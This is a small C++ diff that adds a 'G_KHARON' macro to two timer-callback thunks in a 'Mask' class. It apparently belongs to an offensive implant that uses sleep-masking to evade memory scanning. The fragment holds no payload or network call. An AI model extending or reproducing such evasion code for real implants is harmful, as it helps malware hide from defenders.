@@ -40,6 +40,7 @@ auto DECLFN Mask::SetEventThunk(
     PVOID                 Event,
     PTP_TIMER             Timer
 ) -> VOID {
+    G_KHARON
     Self->Krnl32.SetEvent( Event );
 }
 
@@ -48,6 +49,7 @@ auto DECLFN Mask::RtlCaptureContextThunk(
     PVOID                 Context,
     PTP_TIMER             Timer
 ) -> VOID {
+    G_KHARON
     Self->Ntdll.RtlCaptureContext( (CONTEXT*)Context );
     ( (CONTEXT*)Context )->Rsp = (UPTR)__builtin_return_address( 0 );
 }
